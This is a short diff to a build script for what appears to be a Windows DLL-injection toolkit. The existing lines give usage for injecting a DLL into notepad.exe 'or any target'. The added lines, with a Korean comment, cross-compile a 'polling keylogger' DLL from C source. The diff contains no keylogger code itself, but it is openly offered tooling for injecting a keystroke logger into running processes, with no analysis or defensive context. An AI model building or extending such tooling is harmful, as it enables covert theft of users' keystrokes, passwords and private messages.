@@ -24,3 +24,6 @@ echo "Usage:"
 echo "1. Run notepad.exe (or any target)"
 echo "2. injector.exe notepad.exe [full_path_to_dll]"
 echo "==================================="
+# 폴링 방식 키로거 DLL 컴파일
+echo "[3/3] Compiling polling keylogger DLL..."
+x86_64-w64-mingw32-gcc -shared dll/keylogger_polling.c -o dll/keylogger_polling.dll -luser32
